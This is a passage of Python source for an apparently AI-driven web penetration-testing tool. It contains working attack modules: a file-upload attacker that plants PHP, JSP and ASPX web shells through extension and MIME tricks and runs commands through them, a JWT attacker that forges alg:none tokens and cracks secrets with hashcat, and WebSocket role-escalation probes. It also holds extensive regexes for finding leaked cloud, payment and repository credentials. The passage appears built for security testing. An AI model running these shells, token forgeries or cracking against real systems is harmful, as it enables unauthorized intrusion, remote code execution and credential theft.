        elif mut_type == "HEADER_INJECT":
            if m_status in (200, 201) and b_status in (401, 403):
                ctx = self._access_candidate_context(ep.url, baseline, url, resp)
                ai_verdict = self._confirm_access_candidate("HEADER_INJECT", url, method, baseline, resp, ctx)
                if ai_verdict:
                    added_h = changes.get("add_headers",{})
                    h_name  = list(added_h.keys())[0] if added_h else "header"
                    h_val   = list(added_h.values())[0] if added_h else ""
                    finding = self._make_finding(
                        owasp_id="A01",
                        owasp_name="Broken Access Control",
                        title=f"Header Injection Bypass ({h_name}): {ep.url}",
                        risk=ai_verdict.get("risk", "High"),
                        confidence=ai_verdict.get("confidence", 75),
                        url=ep.url, method=method,
                        param=f"header:{h_name}",
                        payload=f"{h_name}: {h_val}",
                        evidence=(
                            ai_verdict.get("evidence")
                            or f"Adding {h_name}: {h_val} changed status {b_status}->{m_status}"
                        ),
                        response_raw=m_body[:700],
                        exploit_cmd=f"curl -H '{h_name}: {h_val}' '{url}'",
                        remediation=f"Never use {h_name} for authorization decisions.",
                        confirmed=bool(ai_verdict.get("confirmed")),
                    )
            # Header qo'shish orqali ko'proq access oldimi?
            if False and m_status in (200,201) and b_status in (401,403):
                body_l = m_body.lower()
                login_sigs = sum(1 for s in ["password","login"] if s in body_l)
                if login_sigs < 2 and len(m_body) > 100:
                    added_h = changes.get("add_headers",{})
                    h_name  = list(added_h.keys())[0] if added_h else "header"
                    h_val   = list(added_h.values())[0] if added_h else ""
                    finding = self._make_finding(
                        owasp_id="A01",
                        owasp_name="Broken Access Control",
                        title=f"Header Injection Bypass ({h_name}): {ep.url}",
                        risk="High",
                        confidence=82,
                        url=ep.url, method=method,
                        param=f"header:{h_name}",
                        payload=f"{h_name}: {h_val}",
                        evidence=(
                            f"Adding {h_name}: {h_val} changed status "
                            f"{b_status}→{m_status}"
                        ),
                        response_raw=m_body[:600],
                        exploit_cmd=f"curl -H '{h_name}: {h_val}' '{url}'",
                        remediation=f"Never use {h_name} for authorization decisions.",
                    )

        # Log mutation
        if finding:
            self._print_finding(finding)
        else:
            status_str = f"{m_status}"
            if m_status != b_status:
                status_str = f"[yellow]{m_status}[/yellow]"
            console.print(
                f"  [dim]    [{mut_type[:12]:12}] {mut_desc[:50]:50} "
                f"→ {status_str}[/dim]"
            )

        return finding

    # ── AI IDOR verification ──────────────────────────────────────────────────
    def _ai_verify_idor(self, orig_url: str, new_url: str,
                        orig_body: str, new_body: str,
                        description: str) -> dict:
        """AI IDOR topildimi deb tasdiqlaydi."""
        prompt = f"""IDOR verification for authorized penetration test.

Original URL: {orig_url}
Modified URL: {new_url}
Change: {description}

Original response ({len(orig_body)} bytes):
{self._clean(orig_body, 400)}

Modified response ({len(new_body)} bytes):
{self._clean(new_body, 400)}

Is this a real IDOR (Insecure Direct Object Reference)?
- Different user/object data returned?
- Sensitive data exposed that shouldn't be?
- Access to unauthorized object?

Return JSON:
{{
  "is_idor": true/false,
  "confidence": 0-100,
  "evidence": "specific evidence from response",
  "confirmed": true/false,
  "what_changed": "description of what data changed"
}}"""
        result = self.ai._call(prompt, cache=False)
        if result:
            return result
        # Heuristic fallback
        if len(new_body) != len(orig_body) and len(new_body) > 100:
            sens = RiskScorer.score_body(new_body)
            return {
                "is_idor":   bool(sens),
                "confidence": 65 if sens else 40,
                "evidence":   f"Different data returned, size diff: {len(new_body)-len(orig_body)}",
                "confirmed":  False,
            }
        return {"is_idor": False, "confidence": 0}

    # ── Sensitive data leak check ─────────────────────────────────────────────
    def _check_sensitive_leak(self, ep: "Endpoint",
                               body: str, headers: dict) -> List["Finding"]:
        """Response-da real sensitive secrets bormi? Final verdict AI bilan tasdiqlanadi."""
        if not body or len(body) < 20:
            return []

        response_profile = self._response_profile(ep.url, {
            "status": 200,
            "headers": headers,
            "body": body,
        })
        candidates = RiskScorer.score_body(body, url=ep.url, headers=headers)
        if not candidates:
            return []

        strong_candidates = [c for c in candidates if c.get("strong")]
        if self._response_is_publicish(response_profile) and not strong_candidates:
            return []

        verdict = self.ai.verify_sensitive_candidates(
            url=ep.url,
            headers=headers,
            body=body,
            response_profile=response_profile,
            candidates=candidates,
        )
        if not verdict.get("is_sensitive") or verdict.get("confidence", 0) < max(MIN_CONFIDENCE, 70):
            return []

        evidence = verdict.get("evidence") or ", ".join(
            f"{c['label']}: {c['value']}" for c in candidates[:4]
        )
        return [self._make_finding(
            owasp_id="A02",
            owasp_name="Cryptographic Failures",
            title=f"Sensitive Data Exposure in Response: {ep.url}",
            risk=verdict.get("risk", "High"),
            confidence=verdict.get("confidence", 75),
            url=ep.url, method=ep.method,
            param="response_body",
            payload="",
            evidence=evidence,
            response_raw=body[:900],
            exploit_cmd=f"curl -X {ep.method} '{ep.url}'",
            remediation=(
                "Never return sensitive data in API responses. "
                "Mask secrets, move credentials server-side, and apply data minimization."
            ),
            confirmed=True,
        )]

    # ── Cookie security ───────────────────────────────────────────────────────
    def _check_cookie_security(self, ep: "Endpoint",
                                headers: dict) -> List["Finding"]:
        """Cookie-larda HttpOnly, Secure, SameSite bormi?"""
        set_cookie = headers.get("set-cookie", headers.get("Set-Cookie",""))
        if not set_cookie:
            return []
        issues = []
        if "httponly" not in set_cookie.lower():
            issues.append("HttpOnly missing — XSS ile cookie o'g'irlash mumkin")
        if "samesite" not in set_cookie.lower():
            issues.append("SameSite missing — CSRF attack mumkin")
        if "secure" not in set_cookie.lower() and ep.url.startswith("https"):
            issues.append("Secure flag missing — HTTP-da cookie uzatiladi")
        if not issues:
            return []
        return [self._make_finding(
            owasp_id="A05",
            owasp_name="Security Misconfiguration",
            title=f"Insecure Cookie Flags: {ep.url}",
            risk="Medium",
            confidence=88,
            url=ep.url, method="GET",
            param="Set-Cookie",
            payload=set_cookie[:100],
            evidence="; ".join(issues),
            response_raw=set_cookie[:300],
            exploit_cmd=f"curl -v '{ep.url}' | grep -i set-cookie",
            remediation="Add HttpOnly; Secure; SameSite=Strict to all session cookies.",
        )]

    # ── HTTP helpers ──────────────────────────────────────────────────────────
    def _send(self, ep: "Endpoint", params: dict, method: str) -> dict:
        """Standard request."""
        clean = {k.split(":")[-1]: v for k, v in params.items()
                 if not k.startswith("path:") and not k.startswith("header:")}
        extra = {k.split(":")[-1]: v for k, v in params.items()
                 if k.startswith("header:")}
        if method == "GET":
            return self.client.get(ep.url, extra_headers=extra or None)
        return self.client.post(ep.url, data=clean, extra_headers=extra or None)

    def _send_raw(self, method: str, url: str, params: dict,
                  extra_headers: dict, ep: "Endpoint") -> dict:
        """Custom method/url/headers bilan request."""
        clean = {k.split(":")[-1]: v for k, v in params.items()
                 if not k.startswith("path:") and not k.startswith("header:")}
        # Merge extra_headers
        all_extra = dict(extra_headers)

        if method == "GET":
            return self.client.get(url, extra_headers=all_extra or None)
        elif method in ("POST","PUT","PATCH"):
            return self.client.post(url, data=clean, extra_headers=all_extra or None)
        elif method in ("DELETE","HEAD","OPTIONS"):
            return self.client._request(url, method, headers=all_extra or None)
        return self.client.get(url, extra_headers=all_extra or None)

    @staticmethod
    def _clean(text: str, maxlen: int = 600) -> str:
        return re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f]', '', str(text)[:maxlen])

    def _make_finding(self, owasp_id: str, owasp_name: str, title: str,
                      risk: str, confidence: int, url: str, method: str,
                      param: str, payload: str, evidence: str,
                      response_raw: str, exploit_cmd: str,
                      remediation: str, confirmed: bool = False) -> "Finding":
        return Finding(
            owasp_id=owasp_id, owasp_name=owasp_name, title=title,
            risk=risk, confidence=confidence, url=url, method=method,
            param=param, payload=payload, evidence=evidence,
            baseline_diff="repeater",
            tool_output="", request_raw=f"{method} {url}",
            response_raw=response_raw, exploit_cmd=exploit_cmd,
            remediation=remediation, confirmed=confirmed,
            tool="ai_repeater",
        )

    def _print_finding(self, f: "Finding"):
        c = {"Critical":"bold red","High":"red",
             "Medium":"yellow","Low":"cyan"}.get(f.risk,"white")
        console.print(
            f"  [{c}]  🎯 [{f.risk}][/{c}] {f.owasp_id} — {f.title}\n"
            f"  [dim]     Evidence: {f.evidence}[/dim]"
        )


# ─────────────────────────────────────────────────────────────────────────────
# FILE UPLOAD ATTACKER
# ─────────────────────────────────────────────────────────────────────────────
class FileUploadAttacker:
    SHELL_PHP  = "<?php system($_GET['cmd']); ?>"
    SHELL_JSP  = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
    SHELL_ASPX = '<%@ Page Language="C#"%><% Response.Write(System.Diagnostics.Process.Start("cmd",Request["cmd"])); %>'
    UPLOAD_PATHS = ["/uploads/","/upload/","/files/","/images/","/media/",
                    "/static/uploads/","/assets/","/userfiles/","/data/"]

    def __init__(self, client: HTTPClient, ai: AIEngine):
        self.client = client; self.ai = ai

    def attack(self, upload_url: str, tech: dict) -> List[Finding]:
        lang  = tech.get("lang","php")
        shell = self.SHELL_PHP
        if lang == "java":   shell = self.SHELL_JSP
        if lang == "aspnet": shell = self.SHELL_ASPX

        variants = self._variants(lang, shell)
        findings = []
        for name, fname, content, mime in variants[:8]:
            shell_path = f"/tmp/{fname}"
            Path(shell_path).write_text(content)
            cmd = (f"curl -s -X POST -F 'file=@{shell_path};type={mime}' "
                   f"-F 'filename={fname}' '{upload_url}' -w '%{{http_code}}' -o /tmp/upload_resp.txt")
            res  = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
            code = res.stdout.strip()[-3:]
            rb   = ""
            try: rb = Path("/tmp/upload_resp.txt").read_text()
            except Exception: pass
            if code not in ("200","201") and "success" not in rb.lower(): continue

            base = upload_url.split("/upload")[0].split("/file")[0]
            for up in ([self._extract_path(rb, fname)] if self._extract_path(rb,fname) else []) + \
                      [f"{p}{fname}" for p in self.UPLOAD_PATHS]:
                if not up: continue
                check_url = f"{base}{up if up.startswith('/') else '/'+up}"
                hr        = self.client.get(check_url)
                if hr["status"] != 200: continue
                for cmd_test in ["id","whoami"]:
                    test_url = f"{check_url}?cmd={cmd_test}"
                    tr       = self.client.get(test_url)
                    if ("uid=" in tr["body"] and "gid=" in tr["body"]) or \
                       tr["body"].strip().lower() in ("root","www-data","apache","nginx"):
                        findings.append(Finding(
                            owasp_id="A03",owasp_name="Injection",
                            title=f"File Upload RCE [{name}]: {upload_url}",
                            risk="Critical",confidence=97,
                            url=test_url,method="GET",param="file",payload=fname,
                            evidence=f"RCE ({cmd_test}): {tr['body'][:150]}",
                            baseline_diff="upload→rce",tool_output=tr["body"][:400],
                            request_raw=cmd,response_raw=tr["body"][:400],
                            exploit_cmd=f"curl '{check_url}?cmd=id'",
                            remediation="Validate file type server-side. Store outside webroot.",
                            confirmed=True,tool="upload_attack",
                        ))
                        console.print(f"  [bold red]🎯 RCE via upload: {test_url}[/bold red]")
                        return findings
        return findings

    def _extract_path(self, body: str, fname: str) -> str:
        if not body: return ""
        try:
            data = json.loads(body)
            for k in ("path","url","file","location","filename","filepath"):
                if data.get(k): return data[k]
        except Exception: pass
        m = re.search(rf'(/[^\s"\'<>]*{re.escape(fname)})', body)
        return m.group(1) if m else ""

    def _variants(self, lang: str, shell: str) -> list:
        if lang == "php":
            return [
                ("php",       "shell.php",       shell, "application/octet-stream"),
                ("php5",      "shell.php5",       shell, "image/jpeg"),
                ("phtml",     "shell.phtml",      shell, "image/png"),
                ("double",    "shell.php.jpg",    shell, "image/jpeg"),
                ("uppercase", "shell.PhP",        shell, "application/octet-stream"),
                ("phar",      "shell.phar",       shell, "application/octet-stream"),
            ]
        if lang == "java":
            return [("jsp","shell.jsp",shell,"application/octet-stream")]
        return [("aspx","shell.aspx",shell,"application/octet-stream")]


# ─────────────────────────────────────────────────────────────────────────────
# JWT ATTACKER
# ─────────────────────────────────────────────────────────────────────────────
class JWTAttacker:
    def __init__(self, client: HTTPClient, oob: Optional[OOBClient] = None):
        self.client = client
        self.oob    = oob

    def attack(self, jwt: str, endpoints: list) -> List[Finding]:
        findings = []
        if not jwt: return findings
        try:
            parts = jwt.split(".")
            if len(parts) != 3: return findings
            hdr     = json.loads(base64.b64decode(parts[0]+"==").decode("utf-8",errors="ignore"))
            alg     = hdr.get("alg","")
            pay_b64 = parts[1]+"="*(4-len(parts[1])%4)
            payload = json.loads(base64.b64decode(pay_b64))

            # 1. alg:none
            if alg.upper() != "NONE":
                none_hdr = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
                none_jwt = f"{none_hdr}.{parts[1]}."
                for ep in endpoints[:15]:
                    url = ep.get("url","") if isinstance(ep,dict) else ep.url
                    if not url: continue
                    r = self.client._request(url,"GET",headers={"Authorization":f"Bearer {none_jwt}"})
                    if r["status"]==200 and len(r["body"])>100:
                        body_l = r["body"].lower()
                        if not any(s in body_l for s in ["login","unauthorized","invalid","forbidden"]):
                            findings.append(Finding(
                                owasp_id="A02",owasp_name="Cryptographic Failures",
                                title="JWT alg:none Attack — Token Forgery",
                                risk="Critical",confidence=95,
                                url=url,method="GET",param="Authorization",
                                payload=none_jwt[:100],
                                evidence="Server accepted JWT with alg:none",
                                baseline_diff="alg:HS256→alg:none",tool_output=r["body"][:300],
                                request_raw=f"GET {url}\nAuthorization: Bearer {none_jwt}",
                                response_raw=r["body"][:300],
                                exploit_cmd=f"# Forge JWT with alg:none",
                                remediation="Whitelist allowed algorithms. Reject alg:none.",
                                confirmed=True,tool="jwt_attacker",
                            ))
                            break

            # 2. hashcat crack
            if alg.upper().startswith("HS") and shutil.which("hashcat"):
                wl_paths = [
                    "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
                    "/usr/share/wordlists/rockyou.txt",
                    "/tmp/jwt_wl.txt",
                ]
                Path("/tmp/jwt_wl.txt").write_text(
                    "\n".join(["secret","password","admin","key","jwt","token",
                               "supersecret","changeme","123456","secret123"]))
                for wl in wl_paths:
                    if not Path(wl).exists(): continue
                    out = "/tmp/jwt_cracked.txt"
                    subprocess.run(
                        f"hashcat -a 0 -m 16500 '{jwt}' '{wl}' --quiet -o '{out}' --force",
                        shell=True, capture_output=True, timeout=90
                    )
                    if Path(out).exists():
                        cracked = Path(out).read_text().strip()
                        if cracked and ":" in cracked:
                            secret = cracked.split(":")[-1]
                            findings.append(Finding(
                                owasp_id="A02",owasp_name="Cryptographic Failures",
                                title=f"JWT Secret Cracked: '{secret}'",
                                risk="Critical",confidence=99,
                                url="",method="",param="jwt_secret",payload=secret,
                                evidence=f"HS256 secret: '{secret}'",
                                baseline_diff="",tool_output=cracked,
                                request_raw=f"hashcat -m 16500 {jwt[:50]}",response_raw=cracked,
                                exploit_cmd=f"python3 -c \"import jwt; print(jwt.encode({{'role':'admin'}},'{secret}',algorithm='HS256'))\"",
                                remediation="Use 256+ bit random secret. Rotate immediately.",
                                confirmed=True,tool="hashcat",
                            ))
                            console.print(f"  [bold red]🎯 JWT cracked: '{secret}'[/bold red]")
                        break

        except Exception as e:
            console.print(f"  [dim]JWT attack error: {e}[/dim]")
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# WEBSOCKET TESTER
# ─────────────────────────────────────────────────────────────────────────────
class WebSocketTester:
    MESSAGES = [
        '{"action":"ping"}',
        '{"action":"admin","role":"admin"}',
        '{"type":"auth","token":""}',
        '{"role":"admin","action":"getUsers"}',
        '{"cmd":"id"}',
        '{"query":"SELECT * FROM users"}',
    ]

    def __init__(self, ai: AIEngine):
        self.ai = ai

    def test(self, ws_url: str) -> List[Finding]:
        findings = []
        try:
            import websocket as _ws
        except ImportError:
            return []
        try:
            received, errors = [], []
            def on_msg(ws,msg): received.append({"dir":"recv","msg":str(msg)[:500]})
            def on_err(ws,err): errors.append(str(err))
            ws = _ws.WebSocketApp(ws_url, on_message=on_msg, on_error=on_err)
            t  = threading.Thread(target=ws.run_forever, daemon=True)
            t.start(); time.sleep(2)
            for msg in self.MESSAGES:
                try: ws.send(msg); received.append({"dir":"sent","msg":msg}); time.sleep(0.3)
                except Exception: pass
            time.sleep(2); ws.close()
            if not received: return []

            prompt = f"""WebSocket: {ws_url}
Messages: {json.dumps(received[:15],indent=2)}
Check: auth bypass, role escalation, injection.
Return JSON: {{"vulnerable":false,"issues":[{{"type":"...","severity":"High","evidence":"..."}}],"confidence":0}}"""
            result = self.ai._call(prompt) or {}
            if result.get("vulnerable") and result.get("confidence",0)>=50:
                for issue in result.get("issues",[]):
                    findings.append(Finding(
                        owasp_id="A01",owasp_name="Broken Access Control",
                        title=f"WebSocket {issue.get('type','vuln')}: {ws_url}",
                        risk=issue.get("severity","Medium"),
                        confidence=int(result.get("confidence",70)),
                        url=ws_url,method="WS",param="ws_message",
                        payload=str(issue.get("evidence",""))[:200],
                        evidence=str(issue.get("evidence",""))[:300],
                        baseline_diff="ws_analysis",
                        tool_output=json.dumps(received[:8])[:400],
                        request_raw="\n".join(m["msg"] for m in received if m["dir"]=="sent"),
                        response_raw="\n".join(m["msg"] for m in received if m["dir"]=="recv")[:400],
                        exploit_cmd=f"wscat -c '{ws_url}'",
                        remediation="Validate auth/authz on every WebSocket message.",
                        tool="ws_tester",
                    ))
        except Exception as e:
            console.print(f"  [dim]WS error: {e}[/dim]")
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# NUCLEI RUNNER
# ─────────────────────────────────────────────────────────────────────────────
def _v_aws_access(v: str) -> bool:
    return len(v) == 20 and v.startswith("AKIA")


def _v_aws_secret(v: str) -> bool:
    return len(v) == 40


def _v_aws_session(v: str) -> bool:
    return len(v) >= 100


def _v_google_api(v: str) -> bool:
    return v.startswith("AIza") and len(v) == 39


def _v_google_maps(v: str) -> bool:
    return len(v) >= 35


def _v_azure(v: str) -> bool:
    return len(v) >= 88


def _v_true_val(v: str) -> bool:
    return True


def _v_db_pass(v: str) -> bool:
    return len(v) >= 6


def _v_db_user(v: str) -> bool:
    return len(v) >= 3


def _v_jwt(v: str) -> bool:
    return len(v) >= 16


def _v_bearer(v: str) -> bool:
    return len(v) >= 50 and "." in v


def _v_auth_token(v: str) -> bool:
    return len(v) >= 32


def _v_stripe_secret(v: str) -> bool:
    return v.startswith("sk_") and len(v) > 28


def _v_stripe_pub(v: str) -> bool:
    return v.startswith("pk_") and len(v) > 28


def _v_paypal(v: str) -> bool:
    return len(v) >= 16


def _v_twilio(v: str) -> bool:
    return len(v) == 32 and all(c in "0123456789abcdef" for c in v.lower())


def _v_sendgrid(v: str) -> bool:
    return v.startswith("SG.") and len(v) > 65


def _v_slack(v: str) -> bool:
    return v.startswith("xox")


def _v_discord(v: str) -> bool:
    return len(v) > 56


def _v_telegram(v: str) -> bool:
    return ":" in v and len(v) > 44


def _v_github_pat(v: str) -> bool:
    return v.startswith("ghp_") or v.startswith("github_pat_")


def _v_github_oauth(v: str) -> bool:
    return v.startswith("gho_")


def _v_gitlab(v: str) -> bool:
    return v.startswith("glpat-")


def _v_npm(v: str) -> bool:
    return v.startswith("npm_")


def _v_cloudflare(v: str) -> bool:
    return len(v) == 37


def _v_heroku(v: str) -> bool:
    return len(v) == 36


def _v_digitalocean(v: str) -> bool:
    return len(v) == 64


def _v_algolia_key(v: str) -> bool:
    return len(v) == 32


def _v_algolia_app(v: str) -> bool:
    return len(v) == 10


def _v_ga_id(v: str) -> bool:
    return True


def _v_yandex(v: str) -> bool:
    return 6 <= len(v) <= 9


def _v_fb(v: str) -> bool:
    return 13 <= len(v) <= 16


def _v_generic_pass(v: str) -> bool:
    return len(v) >= 8


def _v_generic_api(v: str) -> bool:
    return len(v) >= 16


def _v_conn_string(v: str) -> bool:
    hay = v.lower()
    return any(x in hay for x in ["host=", "server=", "data source", "password", "pwd="])


def _v_debug(v: str) -> bool:
    return v.lower() in ("true", "1", "on")


def _v_encrypt_key(v: str) -> bool:
    return len(v) >= 16


def _v_mailgun(v: str) -> bool:
    return v.startswith("key-") and len(v) == 36


def _v_mailchimp(v: str) -> bool:
    return "-us" in v and len(v) > 35


def _v_ansible(v: str) -> bool:
    return len(v) >= 8


def _v_docker(v: str) -> bool:
    return len(v) >= 6


class SourceCodeReviewer:
    """Review cached HTML/JS/JSON responses for exposed secrets and open config files."""

    SECRET_PATTERNS: List[Dict[str, Any]] = [
        {"name": "AWS Access Key ID", "regex": r'(?:^|[^a-zA-Z0-9])(AKIA[0-9A-Z]{16})(?:[^a-zA-Z0-9]|$)', "risk": "High", "validate": _v_aws_access},
        {"name": "AWS Secret Access Key", "regex": r'(?:aws_secret(?:_access)?_key|AWSSecretKey|aws_secret)\s*[=:"\s]+([A-Za-z0-9/+=]{40})', "risk": "Critical", "validate": _v_aws_secret},
        {"name": "AWS Session Token", "regex": r'(?:aws_session_token|aws_token)\s*[=:"\s]+([A-Za-z0-9/+=]{100,})', "risk": "Critical", "validate": _v_aws_session},
        {"name": "Google API Key", "regex": r'(?:api[_\-]?key|apikey|AIza)["\s:=]+\b(AIza[0-9A-Za-z\-_]{35})\b', "risk": "High", "validate": _v_google_api},
        {"name": "Google Maps API Key", "regex": r'(?:googlemaps?|maps?)[^"\'<>]{0,50}["\']([A-Za-z0-9_\-]{35,50})["\']', "risk": "Medium", "validate": _v_google_maps},
        {"name": "Azure Storage Key", "regex": r'(?:azure|AccountKey)[^"\'<>]{0,30}["\']([A-Za-z0-9+/]{86}==)["\']', "risk": "Critical", "validate": _v_azure},
        {"name": "GCP Service Account", "regex": r'"type"\s*:\s*"service_account"', "risk": "Critical", "validate": _v_true_val},
        {"name": "RSA Private Key", "regex": r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----', "risk": "Critical", "validate": _v_true_val},
        {"name": "PGP Private Key", "regex": r'-----BEGIN PGP PRIVATE KEY BLOCK-----', "risk": "Critical", "validate": _v_true_val},
        {"name": "Database Connection String", "regex": r'(?:mysql|postgres|postgresql|mongodb|redis|mssql|oracle)://[^:]+:[^@\s]{4,}@[^\s"\'<>]+', "risk": "Critical", "validate": _v_conn_string},
        {"name": "Database Password", "regex": r'(?:db_password|database_password|dbpassword|dbpasswd|DB_PASS)\s*[=:"\s]+["\']([^"\']{6,})["\']', "risk": "Critical", "validate": _v_db_pass},
        {"name": "Database Username", "regex": r'(?:db_user(?:name)?|database_user|dbuser|DB_USER)\s*[=:"\s]+["\']([^"\']{3,})["\']', "risk": "Medium", "validate": _v_db_user},
        {"name": "JWT Secret", "regex": r'(?:jwt[_\-]?secret|jwt[_\-]?key|JWT_SECRET|secret[_\-]?key)\s*[=:"\s]+["\']([^"\']{16,})["\']', "risk": "Critical", "validate": _v_jwt},
        {"name": "Bearer Token (hardcoded)", "regex": r'(?:Authorization|Bearer)\s*[=:"\s]+["\']?(?:Bearer\s+)?([A-Za-z0-9_\-\.]{50,})["\']?', "risk": "High", "validate": _v_bearer},
        {"name": "Auth Token / API Token", "regex": r'(?:auth[_\-]?token|api[_\-]?token|access[_\-]?token|authorizationToken)\s*[=:"\s]+["\']([A-Za-z0-9_\-\.]{32,})["\']', "risk": "High", "validate": _v_auth_token},
        {"name": "Stripe Secret Key", "regex": r'\b(sk_(?:live|test)_[0-9a-zA-Z]{24,})\b', "risk": "Critical", "validate": _v_stripe_secret},
        {"name": "Stripe Publishable Key", "regex": r'\b(pk_(?:live|test)_[0-9a-zA-Z]{24,})\b', "risk": "Medium", "validate": _v_stripe_pub},
        {"name": "PayPal Client Secret", "regex": r'(?:paypal[_\-]?(?:client[_\-]?)?secret)\s*[=:"\s]+["\']([^"\']{16,})["\']', "risk": "Critical", "validate": _v_paypal},
        {"name": "Twilio Auth Token", "regex": r'(?:twilio[_\-]?auth[_\-]?token|TWILIO_AUTH)\s*[=:"\s]+["\']([0-9a-f]{32})["\']', "risk": "Critical", "validate": _v_twilio},
        {"name": "SendGrid API Key", "regex": r'\b(SG\.[A-Za-z0-9_\-]{22,}\.[A-Za-z0-9_\-]{43,})\b', "risk": "Critical", "validate": _v_sendgrid},
        {"name": "Slack Token", "regex": r'\b(xox[bpoa]-[0-9]{10,}-[0-9]{10,}-[A-Za-z0-9]{24,})\b', "risk": "High", "validate": _v_slack},
        {"name": "Discord Bot Token", "regex": r'\b([MN][A-Za-z0-9]{23}\.[A-Za-z0-9\-_]{6}\.[A-Za-z0-9\-_]{27,})\b', "risk": "High", "validate": _v_discord},
        {"name": "Telegram Bot Token", "regex": r'\b(\d{8,10}:[A-Za-z0-9_\-]{35})\b', "risk": "High", "validate": _v_telegram},
        {"name": "GitHub Personal Access Token", "regex": r'\b(ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82})\b', "risk": "Critical", "validate": _v_github_pat},
        {"name": "GitHub OAuth Token", "regex": r'\b(gho_[A-Za-z0-9]{36})\b', "risk": "Critical", "validate": _v_github_oauth},
        {"name": "GitLab Personal Token", "regex": r'\b(glpat-[A-Za-z0-9_\-]{20})\b', "risk": "Critical", "validate": _v_gitlab},
        {"name": "npm Token", "regex": r'\b(npm_[A-Za-z0-9]{36})\b', "risk": "High", "validate": _v_npm},
        {"name": "Cloudflare API Key", "regex": r'(?:cloudflare[_\-]?(?:api[_\-]?)?key|CLOUDFLARE_KEY)\s*[=:"\s]+["\']([A-Za-z0-9_]{37})["\']', "risk": "High", "validate": _v_cloudflare},
        {"name": "Heroku API Key", "regex": r'(?:heroku[_\-]?api[_\-]?key|HEROKU_API_KEY)\s*[=:"\s]+["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', "risk": "High", "validate": _v_heroku},
        {"name": "DigitalOcean Token", "regex": r'(?:digitalocean[_\-]?(?:token|key)|DO_TOKEN)\s*[=:"\s]+["\']([A-Za-z0-9]{64})["\']', "risk": "High", "validate": _v_digitalocean},
        {"name": "Algolia API Key", "regex": r'(?:algolia[_\-]?(?:admin[_\-]?)?(?:api[_\-]?)?key|ALGOLIA_KEY)\s*[=:"\s]+["\']([A-Za-z0-9]{32})["\']', "risk": "High", "validate": _v_algolia_key},
        {"name": "Algolia App ID", "regex": r'(?:algolia[_\-]?app[_\-]?id|ALGOLIA_APP_ID)\s*[=:"\s]+["\']([A-Z0-9]{10})["\']', "risk": "Medium", "validate": _v_algolia_app},
        {"name": "Google Analytics / Tag Manager ID", "regex": r'\b(G-[A-Z0-9]{10}|UA-\d{4,9}-\d{1,4}|GTM-[A-Z0-9]{4,8}|AW-\d{9,12})\b', "risk": "Info", "validate": _v_ga_id},
        {"name": "Yandex Metrica Counter ID", "regex": r'(?:ym|metrika|metrica|yandex[_\-]?counter)\s*[=:(,\s]+(\d{6,9})\b', "risk": "Info", "validate": _v_yandex},
        {"name": "Facebook App ID / Pixel", "regex": r'(?:fb[_\-]?app[_\-]?id|facebook[_\-]?app[_\-]?id|fbq)\s*[=:(,\s]+["\']?(\d{13,16})["\']?', "risk": "Info", "validate": _v_fb},
        {"name": "Generic Password (hardcoded)", "regex": r'(?:password|passwd|pass|pwd)\s*[=:]\s*["\']([^"\'${\s]{8,})["\']', "risk": "High", "validate": _v_generic_pass},
        {"name": "Generic API Key / Secret", "regex": r'(?:api[_\-]?(?:key|secret)|app[_\-]?(?:key|secret)|client[_\-]?secret|consumer[_\-]?(?:key|secret))\s*[=:"\s]+["\']([A-Za-z0-9_\-+=/.]{16,})["\']', "risk": "High", "validate": _v_generic_api},
        {"name": "Connection String / DSN", "regex": r'(?:connectionstring|connection_string|conn\.login|DSN)\s*[=:"\s]+["\']([^"\']{10,})["\']', "risk": "Critical", "validate": _v_conn_string},
        {"name": "App Debug Mode ON", "regex": r'(?:app_debug|APP_DEBUG|debug)\s*[=:]\s*["\']?(true|True|TRUE|1|on)["\']?', "risk": "Medium", "validate": _v_debug},
        {"name": "Encryption Key", "regex": r'(?:encryption[_\-]?key|encrypt[_\-]?key|cipher[_\-]?key)\s*[=:"\s]+["\']([^"\']{16,})["\']', "risk": "Critical", "validate": _v_encrypt_key},
        {"name": "Mailgun API Key", "regex": r'\b(key-[A-Za-z0-9]{32})\b', "risk": "High", "validate": _v_mailgun},
        {"name": "Mailchimp API Key", "regex": r'\b([A-Za-z0-9]{32}-us\d{2})\b', "risk": "High", "validate": _v_mailchimp},
        {"name": "Ansible Vault Password", "regex": r'(?:ansible[_\-]?vault[_\-]?password|VAULT_PASS)\s*[=:"\s]+["\']([^"\']{8,})["\']', "risk": "Critical", "validate": _v_ansible},
        {"name": "Docker Registry Password", "regex": r'(?:docker[_\-]?(?:hub[_\-]?)?pass(?:word)?|DOCKER_PASS)\s*[=:"\s]+["\']([^"\']{6,})["\']', "risk": "High", "validate": _v_docker},
        {"name": "SSH Private Key (inline)", "regex": r'(?:-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----)|(?:ssh-rsa AAAA[A-Za-z0-9+/]{100,})', "risk": "Critical", "validate": _v_true_val},
    ]

    _NOT_LEAK_SIGNALS = [
        r'process\.env\.', r'os\.environ', r'os\.getenv\(', r'\$\{[A-Z_]+\}', r'%[A-Z_]+%',
        r'getenv\(', r'ENV\[[\'"]', r'config\(["\']', r'env\(["\']', r'settings\.',
        r'YOUR_.*?_(?:KEY|SECRET|TOKEN|PASSWORD|HERE)', r'<YOUR_', r'REPLACE_ME',
        r'INSERT_YOUR', r'ADD_YOUR', r'EXAMPLE_', r'PLACEHOLDER', r'x{4,}', r'\*{4,}',
        r'\.\.\.+', r'changeme', r'secret_here', r'your[-_]?(?:api[-_]?)?key',
        r'none|null|undefined|n/a', r'example\.(?:com|org|net)', r'localhost(?::\d+)?/test',
        r'test[-_]?(?:key|secret|token)', r'fake[-_]?(?:key|secret)', r'sample[-_]?(?:key|secret)',
        r'demo[-_]?(?:key|secret)',
    ]

    MIN_ENTROPY = {"Critical": 3.0, "High": 3.2, "Medium": 2.5, "Info": 0.0}

    def __init__(self, client: "HTTPClient", ai: "AIEngine", console_obj: Any, finding_class: Any = None, max_js_files: int = 50):
        self.client = client
        self.ai = ai
